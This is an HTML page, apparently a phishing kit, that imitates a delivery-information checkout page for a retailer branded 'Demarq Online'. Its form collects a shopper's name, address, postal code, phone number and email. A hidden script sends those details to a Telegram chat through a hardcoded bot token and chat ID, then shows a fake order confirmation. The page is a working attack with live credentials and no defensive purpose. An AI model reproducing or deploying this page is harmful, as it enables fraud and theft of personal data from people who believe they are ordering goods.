<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations de Livraison - Demarq Online</title>
    <style>
        /* نفس التنسيق السابق */
    </style>
</head>
<body>

    <!-- شريط الرسالة العلوي -->
    <div class="top-bar">
        <span>LIVRAISON GRATUITE</span> dès 49€
    </div>

    <!-- رأس الصفحة -->
    <header>
        <div class="logo">demarq <span style="color: #00e6e6;">online</span></div>
        <div class="search">
            <input type="text" placeholder="Senseo, lave-linge, TV 4K..." />
        </div>
        <div class="cart">0 PANIER</div>
    </header>

    <!-- النموذج لجمع المعلومات -->
    <div class="container">
        <h1>Informations de Livraison</h1>
        
        <form id="customer-form">
            <!-- معلومات العميل -->
            <div class="form-section">
                <label for="full-name">Nom Complet <span class="required">*</span></label>
                <input type="text" id="full-name" name="full-name" required />
            </div>

            <div class="form-section">
                <label for="address">Adresse de Livraison <span class="required">*</span></label>
                <input type="text" id="address" name="address" required />
            </div>

            <div class="form-section">
                <label for="city">Ville <span class="required">*</span></label>
                <input type="text" id="city" name="city" required />
            </div>

            <div class="form-section">
                <label for="postal-code">Code Postal <span class="required">*</span></label>
                <input type="text" id="postal-code" name="postal-code" required />
            </div>

            <div class="form-section">
                <label for="phone">Numéro de Téléphone <span class="required">*</span></label>
                <input type="tel" id="phone" name="phone" required />
            </div>

            <div class="form-section">
                <label for="email">Email <span class="required">*</span></label>
                <input type="email" id="email" name="email" required />
            </div>

            <!-- خيارات الشحن -->
            <div class="form-section">
                <label for="shipping-method">Méthode de Livraison</label>
                <select id="shipping-method" name="shipping-method">
                    <option value="standard">Livraison Standard (5 à 7 jours)</option>
                    <option value="express">Livraison Express (2 à 3 jours)</option>
                </select>
            </div>

            <!-- زر الإرسال -->
            <div class="form-section">
                <button type="submit" class="submit-btn">Confirmer la Commande</button>
            </div>
        </form>
    </div>

    <script>
        // إرسال البيانات إلى البوتات
        document.getElementById('customer-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            // جمع البيانات من النموذج
            const fullName = document.getElementById('full-name').value;
            const address = document.getElementById('address').value;
            const city = document.getElementById('city').value;
            const postalCode = document.getElementById('postal-code').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const shippingMethod = document.getElementById('shipping-method').value;
            
            // إعداد البيانات التي سيتم إرسالها
            const message = `Nom: ${fullName}\nAdresse: ${address}\nVille: ${city}\nCode Postal: ${postalCode}\nTéléphone: ${phone}\nEmail: ${email}\nMéthode de Livraison: ${shippingMethod}`;
            
            // التوكنات والمعرفات الخاصة بالبوتات
            const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const bot2Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const bot1Id = '5372119436';
            const bot2Id = '5372119436';
            
            // إرسال البيانات إلى البوت الأول
            sendToTelegram(bot1Token, bot1Id, message);

            // إرسال البيانات إلى البوت الثاني
            sendToTelegram(bot2Token, bot2Id, message);
        });

        // دالة لإرسال الرسالة إلى بوت Telegram
        function sendToTelegram(token, chatId, message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const params = {
                chat_id: chatId,
                text: message
            };

            // إرسال الطلب عبر POST
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent:', data);
                alert('Votre commande a été envoyée avec succès!');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Il y a eu un problème avec l\'envoi de la commande.');
            });
        }
    </script>
</body>
</html>
